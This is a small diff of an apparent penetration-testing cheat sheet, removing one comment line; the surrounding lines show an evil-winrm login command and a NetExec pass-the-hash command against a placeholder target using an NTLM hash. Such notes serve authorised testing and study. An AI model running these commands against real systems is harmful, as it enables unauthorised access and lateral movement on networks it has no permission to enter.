@@ -100,7 +100,6 @@ evil-winrm -i $IP -u username -p password
 
 ## Pass-the-hash with NetExec after obtaining NTLM hash
 ```bash
-# Change protocol: smb OR winrm
 netexec smb $IP -u username -H aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
 ```
 
